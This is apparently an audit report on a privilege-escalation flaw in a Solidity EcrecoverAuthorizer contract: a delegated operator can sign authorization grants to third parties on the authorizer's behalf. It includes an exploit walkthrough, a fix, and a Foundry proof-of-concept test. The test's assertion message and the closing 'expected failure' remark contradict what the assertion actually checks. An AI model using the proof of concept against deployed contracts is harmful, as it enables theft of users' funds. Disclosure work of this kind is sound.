### Title
Authorized Operator Can Sign EcrecoverAuthorizer Messages to Escalate Privileges to Arbitrary Third Parties - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that is already authorized by the authorizer in Midnight, not just the authorizer themselves. Because submission is already permissionless (anyone can relay a pre-signed message), the `isAuthorized` check on the *signer* serves no legitimate purpose and instead allows any authorized operator to sign new authorization messages on the authorizer's behalf, granting arbitrary third parties full coarse-grained control over the authorizer's Midnight state.

### Finding Description
The vulnerable check is at `src/periphery/EcrecoverAuthorizer.sol` lines 33–36:

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

`signer` is the address recovered from the EIP-712 signature over the full `Authorization` struct (including `authorizer`, `authorized`, `isAuthorized`, `nonce`, `deadline`). The check passes if the signer is either the authorizer or anyone the authorizer has previously authorized in Midnight.

**Exploit flow (preconditions → trigger → bad state):**

1. Alice calls `midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, alice)` — required so the final downstream call `midnight.setIsAuthorized(charlie, true, alice)` succeeds (since `msg.sender` of that call is `EcrecoverAuthorizer` and `onBehalf` is `alice`). [1](#0-0) 
2. Alice calls `midnight.setIsAuthorized(bob, true, alice)` — authorizing Bob for some purpose (e.g., bundler operations). This is the only additional precondition.
3. Bob constructs `Authorization{authorizer: alice, authorized: charlie, isAuthorized: true, nonce: N, deadline: far_future}`.
4. Bob signs the EIP-712 digest of that struct with **his own private key**.
5. Bob calls `EcrecoverAuthorizer.setIsAuthorized(auth, sig)`.
6. `ecrecover` returns `bob`. The check `isAuthorized[alice][bob] == true` passes. [2](#0-1) 
7. `midnight.setIsAuthorized(charlie, true, alice)` executes, setting `isAuthorized[alice][charlie] = true`. [3](#0-2) 

**Why existing checks do not stop it:**

The `testEcrecoverAuthorizerPermissionless` test confirms that submission is already permissionless — anyone can relay a pre-signed message without any `msg.sender` check. [4](#0-3)  Therefore the `isAuthorized` branch on the *signer* is not needed for relay and exists solely to allow a delegate to sign, which is the dangerous behavior. The nonce and deadline checks do not constrain *who* signs, only *when* and *how many times*. [5](#0-4) 

### Impact Explanation
Charlie gains `isAuthorized[alice][charlie] == true`. With this, Charlie can call `midnight.setIsAuthorized`, `midnight.setConsumed`, `midnight.take` (as taker on Alice's behalf), `midnight.withdrawCollateral`, and all bundler entry points on Alice's behalf. [1](#0-0)  This is full coarse-grained control over Alice's Midnight state, achieved without Alice's consent and without any privileged access — only a prior authorization of Bob for an unrelated purpose.

### Likelihood Explanation
The preconditions are realistic and common: any user who both (a) uses `EcrecoverAuthorizer` for signature-based authorization and (b) authorizes any operator (e.g., a bundler, a ratifier, or another contract) is vulnerable. Both authorizations are normal protocol usage. The attack is repeatable with any nonce value and requires no special timing or oracle conditions.

### Recommendation
Remove the `isAuthorized` branch from the signer check entirely. Since submission is already permissionless, the only valid signer must be the authorizer themselves:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

If delegated signing is intentionally desired, it must be scoped to a separate, purpose-bound authorization type (not the general `isAuthorized` mapping) so that an operator authorized for bundler use cannot also sign authorization grants. [2](#0-1) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract DelegateEscalationTest is BaseTest {
    function testDelegateCanEscalatePrivileges() public {
        (address alice, uint256 aliceKey) = makeAddrAndKey("alice");
        (address bob,   uint256 bobKey)   = makeAddrAndKey("bob");
        address charlie                   = makeAddr("charlie");
        privateKey[alice] = aliceKey;
        privateKey[bob]   = bobKey;

        // Precondition 1: Alice authorizes EcrecoverAuthorizer (normal usage)
        vm.prank(alice);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, alice);

        // Precondition 2: Alice authorizes Bob for bundler use
        vm.prank(alice);
        midnight.setIsAuthorized(bob, true, alice);

        // Bob constructs an authorization granting Charlie access to Alice's state
        Authorization memory auth = Authorization({
            authorizer:   alice,
            authorized:   charlie,
            isAuthorized: true,
            nonce:        ecrecoverAuthorizer.nonce(alice), // correct nonce
            deadline:     block.timestamp + 365 days
        });

        // Bob signs with his own key — NOT Alice's
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep  = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH,
                                block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest     = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(bobKey, digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // Bob submits — succeeds despite Alice never consenting to Charlie
        vm.prank(bob);
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        // Assert: Charlie now has full authorization over Alice's state
        assertTrue(midnight.isAuthorized(alice, charlie),
            "Charlie should NOT have been authorized");

        // Assert: Alice's nonce was consumed (attack is irreversible without Alice acting)
        assertEq(ecrecoverAuthorizer.nonce(alice), 1);
    }
}
```

Expected assertion failure on `assertTrue` demonstrates the invariant violation: an operator authorized for one purpose (bundler) can grant an arbitrary third party full control over the authorizer's Midnight state.
